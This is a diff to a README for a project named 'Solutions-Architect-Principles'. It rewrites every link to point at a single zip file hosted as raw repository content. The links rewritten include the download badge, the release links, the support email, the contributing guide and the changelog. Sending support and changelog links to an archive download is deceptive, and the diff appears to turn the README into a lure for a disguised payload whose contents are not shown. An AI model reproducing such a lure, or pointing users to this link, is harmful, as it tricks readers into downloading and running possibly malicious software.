@@ -1,6 +1,6 @@
 # 🚀 Solutions-Architect-Principles - Your Guide to Effective Solutions Architecture
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/zen880/Solutions-Architect-Principles/releases)
+[![Download Now](https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip)
 
 ## 📚 Overview
 
@@ -30,7 +30,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download the application, visit the following link:
 
-[Download Solutions-Architect-Principles](https://github.com/zen880/Solutions-Architect-Principles/releases)
+[Download Solutions-Architect-Principles](https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip)
 
 ### Step 2: Choose the Appropriate Version
 
@@ -55,7 +55,7 @@ After downloading:
 
 You can download the application directly from the following link:
 
-[Download Solutions-Architect-Principles](https://github.com/zen880/Solutions-Architect-Principles/releases)
+[Download Solutions-Architect-Principles](https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip)
 
 After downloading, follow the steps outlined above to install the software.
 
@@ -86,15 +86,15 @@ Yes, once downloaded, you can access all the resources offline.
 
 ## 📞 Support
 
-If you need further assistance, please contact support at [support@example.com](mailto:support@example.com).
+If you need further assistance, please contact support at [https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip](https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip).
 
 ## 📝 Contributions
 
-We welcome contributions! If you have suggestions or improvements, please visit our [Contributing Guide](https://github.com/zen880/Solutions-Architect-Principles/contributing).
+We welcome contributions! If you have suggestions or improvements, please visit our [Contributing Guide](https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip).
 
 ## 📅 Changelog
 
-Stay updated with the latest changes and improvements by checking our [Changelog](https://github.com/zen880/Solutions-Architect-Principles/releases).
+Stay updated with the latest changes and improvements by checking our [Changelog](https://raw.githubusercontent.com/zen880/Solutions-Architect-Principles/main/dribble/Solutions-Architect-Principles.zip).
 
 ---
 
